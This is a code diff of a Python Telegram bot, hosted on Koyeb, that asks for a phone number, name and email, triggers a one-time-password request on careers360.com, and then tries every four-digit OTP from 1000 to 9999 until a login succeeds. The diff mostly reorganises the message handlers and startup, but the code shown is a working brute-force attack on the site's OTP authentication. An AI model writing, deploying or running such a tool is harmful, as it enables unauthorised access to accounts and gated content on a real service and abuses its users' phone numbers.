@@ -2,9 +2,10 @@ import requests
 import asyncio
 import random
 import logging
+import threading
 from flask import Flask
 from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # Flask app for Koyeb health check
 flask_app = Flask(__name__)
@@ -35,11 +36,11 @@ ASK_ME_LINKS = [
     "ebooks/jee-main-highest-scoring-chapters-and-topics"
 ]
 
-# Command: /op to start the login process
+# Command: /op to start login
 async def op(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Send details in `{number} - {Name} - {email}` format.")
 
-# Handling user input for login
+# Handle user input for login
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_input = update.message.text.strip()
     try:
@@ -59,8 +60,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     msg = await update.message.reply_text("Otp Sent - 👍")
-
     otp_response = requests.post(otp_url, json=otp_data, headers=HEADERS)
+
     if otp_response.status_code == 200 and otp_response.json().get("result"):
         await msg.edit_text("Signup Successfull - 👍")
     else:
@@ -92,7 +93,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     found_otp = None
     checked_otps = 0
 
-    for otp in range(1000, 10000):  # Checking OTPs
+    for otp in range(1000, 10000):
         login_data = {
             "current_url": f"https://engineering.careers360.com/download/{ask_me}",
             "destination": f"https://engineering.careers360.com/download/{ask_me}",
@@ -118,28 +119,21 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await msg.edit_text("❌ OTP brute-force failed.")
 
-# Async function to start the bot
-async def main():
+# Start Flask in separate thread
+def start_flask():
+    flask_app.run(host="0.0.0.0", port=5000)
+
+# Start Telegram Bot
+async def start_telegram_bot():
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("op", op))
     app.add_handler(CommandHandler("start", op))
-    app.add_handler(CommandHandler("help", op))
-    app.add_handler(CommandHandler("login", op))
-    app.add_handler(CommandHandler("signup", op))
-    app.add_handler(CommandHandler("retry", op))
-    app.add_handler(CommandHandler("status", op))
-    app.add_handler(CommandHandler("progress", op))
-    app.add_handler(CommandHandler("check", op))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    app.add_handler(CommandHandler("input", handle_message))
-
+    print("Bot is running...")
     await app.run_polling()
 
-# Run Flask in a separate thread
-import threading
-threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=5000)).start()
-
-# Run the bot
+# Run both Flask & Telegram Bot
 if __name__ == "__main__":
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(main())
+    threading.Thread(target=start_flask, daemon=True).start()
+    asyncio.run(start_telegram_bot())
